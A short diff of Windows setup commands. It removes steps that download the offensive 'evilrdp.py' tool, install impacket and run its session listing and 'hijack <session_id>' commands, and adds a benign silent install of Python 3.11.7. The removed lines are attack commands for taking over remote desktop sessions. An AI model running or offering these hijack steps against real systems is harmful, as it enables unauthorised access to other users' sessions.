@@ -1,12 +1,2 @@
-
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/skelsec/evilrdp/master/evilrdp.py" -OutFile "C:\Temp\evilrdp.py"
-
-
-python -m venv env
-.\env\Scripts\activate
-pip install pywin32 impacket
-
-
-
-python evilrdp.py sessions
-python evilrdp.py hijack <session_id>
+Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe -OutFile C:\Temp\python.exe
+Start-Process -FilePath C:\Temp\python.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
